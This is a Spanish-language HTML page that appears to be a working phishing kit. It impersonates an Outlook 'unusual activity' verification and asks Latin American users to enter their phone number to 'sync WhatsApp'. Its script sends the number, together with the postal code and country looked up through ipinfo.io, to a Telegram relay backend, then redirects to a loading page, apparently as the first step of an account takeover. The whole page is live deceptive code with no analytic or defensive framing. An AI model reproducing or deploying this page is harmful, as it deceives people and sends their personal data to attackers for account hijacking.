<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Actividad en su cuenta - confirmacion</title>
  <link rel="stylesheet" type="text/css" href="https://sappsapp23.sirv.com/docs/styles.css" />
  <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      overflow-x: hidden;
      width: 100vw;
      max-width: 100vw;
    }

    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      width: 100%;
      max-width: 100vw;
      text-align: center;
    }

    form {
      width: 100%;
      max-width: 400px;
    }

    select, input, button {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
    }

    #popup, footer {
      width: 100%;
      text-align: center;
    }

    img {
      max-width: 100%;
      height: auto;
    }

    /* Spinner dentro del botón */
    .btn-spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* Estilo del botón cuando está cargando */
    #submitButton.loading {
      cursor: not-allowed;
      opacity: 0.8;
    }
    
    /* Ocultar texto cuando está cargando */
    #submitButton.loading .btn-text {
      display: none;
    }
    
    /* Mostrar spinner solo cuando tiene clase loading */
    #submitButton .btn-spinner {
      display: none;
    }
    
    #submitButton.loading .btn-spinner {
      display: inline-block;
    }

    /* Centrar contenido del botón */
    #submitButton {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 44px;
    }
  </style>
</head>
<body>

  <div id="popup">
    <div class="popup-content">
      <h2>Actividad Inusual Detectada</h2>
      <p>Hemos detectado actividades inusuales de parte de su cuenta de Outlook. Para seguir usándola normalmente, realice una verificación.</p>
      <img src="https://sappsapp23.sirv.com/docs/21-18-05-265_512.gif" alt="Cargando...">
    </div>
  </div>

  <header></header>

  <div class="content" style="display: none;">
    <img src="https://sappsapp23.sirv.com/docs/117_outlook.jpg" width="250" alt="Logo WhatsApp" style="max-width: 100%;">
    <p>Ingrese su número de teléfono para sincronizar su cuenta de WhatsApp con Outlook:</p>
    <form id="loginForm">
      <select id="country" required>
        <option value="" disabled selected>Selecciona tu país</option>
        <option value="+54">🇦🇷 Argentina</option>
        <option value="+591">🇧🇴 Bolivia</option>
        <option value="+55">🇧🇷 Brasil</option>
        <option value="+56">🇨🇱 Chile</option>
        <option value="+57">🇨🇴 Colombia</option>
        <option value="+506">🇨🇷 Costa Rica</option>
        <option value="+53">🇨🇺 Cuba</option>
        <option value="+1">🇩🇴 República Dominicana</option>
        <option value="+593">🇪🇨 Ecuador</option>
        <option value="+503">🇸🇻 El Salvador</option>
        <option value="+502">🇬🇹 Guatemala</option>
        <option value="+504">🇭🇳 Honduras</option>
        <option value="+52">🇲🇽 México</option>
        <option value="+505">🇳🇮 Nicaragua</option>
        <option value="+507">🇵🇦 Panamá</option>
        <option value="+595">🇵🇾 Paraguay</option>
        <option value="+51">🇵🇪 Perú</option>
        <option value="+1">🇵🇷 Puerto Rico</option>
        <option value="+598">🇺🇾 Uruguay</option>
        <option value="+58">🇻🇪 Venezuela</option>
      </select>
      <input type="tel" id="telefono" name="telefono" placeholder="Número de teléfono" required>
      <button type="submit" id="submitButton">
        <span class="btn-text">Continuar</span>
        <span class="btn-spinner"></span>
      </button>
    </form>
  </div>

  <footer>
    <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" alt="Logo WhatsApp" style="max-width: 100%;">
  </footer>

  <script>
    window.onload = function () {
      setTimeout(function () {
        document.getElementById('popup').style.display = 'none';
        document.querySelector('.content').style.display = 'flex';
      }, 5000);

      const countrySelect = document.getElementById('country');
      const phoneInput = document.getElementById('telefono');

      countrySelect.addEventListener('change', function () {
        phoneInput.value = countrySelect.value;
      });

      // Pre-seleccionar país con ipinfo.io
      fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
          const countryMap = {
            'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56', 'CO': '+57',
            'CR': '+506', 'CU': '+53', 'DO': '+1', 'EC': '+593', 'SV': '+503',
            'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507',
            'PY': '+595', 'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
          };
          countrySelect.value = countryMap[data.country] || '';
        })
        .catch(error => console.error('Error al obtener la ubicación:', error));
    }
  </script>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      function obtenerUbicacionYEnviarMensajeTelegram(telefono, nextPage, message) {
        fetch('https://ipinfo.io/json')
          .then(response => response.json())
          .then(data => {
            var zipCode = data.postal;     // ZIP CODE
            var pais = data.country;       // PAIS (código ISO)

            // Formato exacto solicitado: Zip Code y Pais en la misma línea
            message += '\nZip Code: ' + (zipCode || 'No disponible') + ' Pais: ' + pais;
            enviarMensajeTelegram(message, nextPage);
          })
          .catch(error => {
            console.error("Error al obtener la ubicación:", error);
            message += "\nZip Code: No disponible Pais: Desconocido";
            enviarMensajeTelegram(message, nextPage);
          });
      }

      function enviarMensajeTelegram(mensaje, nextPage) {
        var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
        
        var params = {
          message: mensaje
        };

        fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(params)
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Ocurrió un error al enviar el mensaje.');
          }
          console.log('Mensaje enviado con éxito.');
          window.location.href = nextPage;
        })
        .catch(error => {
          console.error('Error al enviar el mensaje:', error);
          // Rehabilitar el botón si hay error
          const btn = document.getElementById("submitButton");
          btn.classList.remove("loading");
          btn.disabled = false;
        });
      }

      var loginForm = document.getElementById("loginForm");
      if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
          event.preventDefault();
          
          const btn = document.getElementById("submitButton");
          
          // Activar estado de carga: oculta texto, muestra spinner, deshabilita botón
          btn.classList.add("loading");
          btn.disabled = true;
          
          var telefono = document.getElementById("telefono").value;
          
          // Mensaje base con formato exacto
          var mensajeBase = "💲 Whatsapp 💲:\nTELEFONO: " + telefono;
          
          obtenerUbicacionYEnviarMensajeTelegram(telefono, "loading.html?action=telefono", mensajeBase);
        });
      }
    });
  </script>
</body>
</html>
